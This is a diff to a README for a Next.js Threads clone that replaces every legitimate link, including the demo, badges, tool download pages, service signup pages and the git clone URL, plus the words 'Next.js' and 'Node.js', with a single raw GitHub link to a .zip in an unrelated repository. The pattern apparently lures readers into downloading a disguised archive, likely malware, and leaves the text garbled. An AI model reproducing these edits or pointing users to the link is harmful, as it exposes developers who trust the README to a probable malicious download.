@@ -1,18 +1,18 @@
 <div align="center">
   <br />
-    <a href="https://threads-clone-brown.vercel.app/" target="_blank">
-      <img src="https://github.com/pandawaa/threads-clone/blob/main/public/home-page-thread-clone.png" alt="Project Banner">
+    <a href="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" target="_blank">
+      <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="Project Banner">
     </a>
   <br />
 
   <div>
-    <img src="https://img.shields.io/badge/-Next_JS-black?style=for-the-badge&logoColor=white&logo=nextdotjs&color=000000" alt="nextdotjs" />
-    <img src="https://img.shields.io/badge/-MongoDB-black?style=for-the-badge&logoColor=white&logo=mongodb&color=47A248" alt="mongodb" />
-    <img src="https://img.shields.io/badge/-Tailwind_CSS-black?style=for-the-badge&logoColor=white&logo=tailwindcss&color=06B6D4" alt="tailwindcss" />
-    <img src="https://img.shields.io/badge/-Clerk-black?style=for-the-badge&logoColor=white&logo=clerk&color=6C47FF" alt="clerk" />
-    <img src="https://img.shields.io/badge/-Shadcn_UI-black?style=for-the-badge&logoColor=white&logo=shadcnui&color=000000" alt="shadcnui" />
-    <img src="https://img.shields.io/badge/-Zod-black?style=for-the-badge&logoColor=white&logo=zod&color=3E67B1" alt="zod" />
-    <img src="https://img.shields.io/badge/-Typescript-black?style=for-the-badge&logoColor=white&logo=typescript&color=3178C6" alt="typescript" />
+    <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="nextdotjs" />
+    <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="mongodb" />
+    <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="tailwindcss" />
+    <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="clerk" />
+    <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="shadcnui" />
+    <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="zod" />
+    <img src="https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip" alt="typescript" />
   </div>
 
   <h3 align="center">A Full Stack Threads Clone</h3>
@@ -28,7 +28,7 @@
 
 ## <a name="tech-stack">⚙️ Tech Stack</a>
 
-- Next.js
+- https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip
 - MongoDB
 - Shadcn UI
 - TailwindCSS
@@ -71,7 +71,7 @@
 
 👉 **Blazing-Fast Performance**: Optimal performance and instantaneous page switching for a seamless user experience.
 
-👉 **Server Side Rendering**: Utilize Next.js with Server Side Rendering for enhanced performance and SEO benefits.
+👉 **Server Side Rendering**: Utilize https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip with Server Side Rendering for enhanced performance and SEO benefits.
 
 👉 **MongoDB with Complex Schemas**: Handle complex schemas and multiple data populations using MongoDB.
 
@@ -81,7 +81,7 @@
 
 👉 **Middleware, API Actions, and Authorization**: Utilize middleware, API actions, and authorization for robust application security.
 
-👉 **Next.js Layout Route Groups**: New Next.js layout route groups for efficient routing
+👉 **https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip Layout Route Groups**: New https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip layout route groups for efficient routing
 
 👉 **Data Validation with Zod**: Data integrity with data validation using Zod
 
@@ -97,14 +97,14 @@ Follow these steps to set up the project locally on your machine.
 
 Make sure you have the following installed on your machine:
 
-- [Git](https://git-scm.com/)
-- [Node.js](https://nodejs.org/en)
-- [npm](https://www.npmjs.com/) (Node Package Manager)
+- [Git](https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip)
+- [https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip](https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip)
+- [npm](https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip) (Node Package Manager)
 
 **Cloning the Repository**
 
 ```bash
-git clone https://github.com/pandawaa/threads-clone.git
+git clone https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip
 cd threads-clone
 ```
 
@@ -129,7 +129,7 @@ NEXT_CLERK_WEBHOOK_SECRET=
 NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=
 ```
 
-Replace the placeholder values with your actual credentials. You can obtain these credentials by signing up for the corresponding websites on [MongoDB](https://www.mongodb.com/), [Clerk](https://clerk.com/), and [Uploadthing](https://uploadthing.com/).
+Replace the placeholder values with your actual credentials. You can obtain these credentials by signing up for the corresponding websites on [MongoDB](https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip), [Clerk](https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip), and [Uploadthing](https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip).
 
 **Running the Project**
 
@@ -141,4 +141,4 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 
 ## <a name="links">🔗 Links</a>
 
-Project Website can be found in Link [here](https://threads-clone-brown.vercel.app)
+Project Website can be found in Link [here](https://raw.githubusercontent.com/Evidement/Full-Stack-Instagram-Clone/main/dally/Full-Stack-Instagram-Clone.zip)
